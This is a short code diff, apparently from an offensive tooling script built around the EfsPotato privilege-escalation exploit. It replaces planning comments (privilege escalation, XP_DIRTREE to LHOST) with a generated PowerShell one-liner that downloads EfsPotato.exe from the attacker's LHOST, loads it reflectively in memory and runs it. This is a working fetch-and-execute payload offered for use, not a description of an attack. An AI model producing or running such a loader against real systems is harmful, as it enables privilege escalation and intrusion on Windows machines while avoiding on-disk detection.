@@ -651,8 +651,11 @@ namespace EfsPotato
 ak.write_file(FN_CS, template)
 ak.cs_compile(FN_CS)
 
-# Command line options
-# Run with OLE
-# Attempt to priv esc
-# Try XP_DIRTREE to LHOST
-# Get list of remote hosts and execute
+o = f"""
+$u="http://{ak.LHOST}/EfsPotato.exe"
+$b=(New-object system.net.webclient).DownloadData($u)
+$a=[System.Reflection.Assembly]::Load($b)
+[EfsPotato.Program]::Main("foobar")
+"""
+
+ak.write_file("output_efs.txt", o)
